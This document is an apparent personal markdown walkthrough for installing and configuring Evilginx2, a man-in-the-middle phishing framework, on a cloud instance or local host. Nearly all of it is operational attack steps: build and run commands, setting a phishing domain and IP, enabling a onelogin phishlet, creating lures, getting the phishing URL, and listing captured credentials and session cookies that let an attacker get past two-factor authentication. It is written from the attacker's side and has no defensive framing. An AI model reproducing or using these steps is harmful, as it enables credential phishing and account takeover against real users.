

```https://github.com/kgretzky/evilginx2```

```NOTE: You can run EVILGINX2 in a tmux session so that when you quit your ssh connection, the tool keeps on running.```

Commands: https://en.kali.tools/?p=963

### Introduction:

Evilginx2 is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection. 
What is means is Evilginx2 is siting in the communication between our victim and the actual legitimate login page capturing all traffic passed through. This means we can also capture the session cookies and inout them into our own browser allowing us to successfully authenticate ourselves as the victim, when it is time to login with the credentials we have aquired.

### Configuring EvilGinx2 on Cloud:

Install and config Evilginx2 inside the instance you have created (Open a new tab, ssh back into the EC2, and complete the steps to install Evilginx)

* Since go is already installed we can eneter the following commands to set up Evilginx2:
            
```
sudo apt-get -y install git make
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make
```
            
* If everything was done right you should be able to go ahead and run the program:
            
```sudo ./bin/evilginx -p ./phishlets/```
            
NOTE: Ignore warning - ```[!!!] Failed to start nameserver on port 53```



* Now that evilginx2 is istalled and running it is time to finish setting up the program to exucute the way we want it to (Complete the steps to properly configure evilginx2:):

* Set up the domain you are using (Enter the domain that you are using): 
            
```config domain raymondspizzeria.cf```
            
* Tell evilginx what IP it should be running on (Enter the ip from your ec2 instance):
            
```config ip 44.201.169.181```

***

### Configuring EvilGinx2 on Host:

```
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2                                       
make           
sudo cp bin/evilginx /usr/bin
sudo cp -r phishlets/ /usr/share/evilginx/
sudo cp -r templates /usr/share/evilginx/
sudo evilginx
```

Run evilginx2 and if the phishlets have been loaded successfully you should see the tool run. 

Now you need to edit the config and ``` add your domain and IP and the redirect URL. ```

[ Any scanners scanning your domain without the ```lure parameter``` will automatically get redirected to the "redirect_url" you set up here ]

We also need to setup a TLS Certificate for our domain. the Evilginx tool can handle all that for us. 

ENTER:

``` 
: phishlets hostname therecap
therecap.tk
: phishlets enable therecap
```

***

***

### After installation Set-up:

* We need to choose one of the phishlets that we weant to use and configure it in evilginx:
            
```phishlets hostname <pick one, i like onelogin> <enetr whatever dns we just created>```
            
[ex.] ```phishlets hostname onelogin login.raymondspizzeria.cf```
[output] ```[04:57:58] [inf] disabled phishlet 'onelogin'```
            
* Now we need to enable the phishlet 'onelogin' that we just configured:
            
```phishlets enable onelogin```
            
* Next we need to creates out lures:
            
```lures create onelogin```
            
[output] ```[04:31:37] [inf] created lure with ID: 0```
            
* Next we are going to want to get our actual url for out phish:
            
```lures get-url 0```

[ Now open a new wwbbrowser and test out this new link produced by Evilginx and make sure that it works ! ! ! ]

***

We also need to add the URL the victim will be redirected to AFTER logging in. This is different from the ```config redirect_url``` as that one is for the scanners and unintended users and this one is for the victims post-login. - (The default redirect url is YT rickroll)

```
: lures edit 1 redirect_url
https://www.therecap.org/
[04:46:06] [inf] redirect_url =
'https://www.therecap.org/'
```

Once that is in you can navigate to the lure URL to make sure its works properly.



***

### Tokens and Credentials:

```lures``` -  Shows all current actives lures that are available to be used

```sessions``` - Shows active sessions currently runnings 

```sessions <session_# Here>``` - will display all credentials and cookies captured fromt he session you choose 
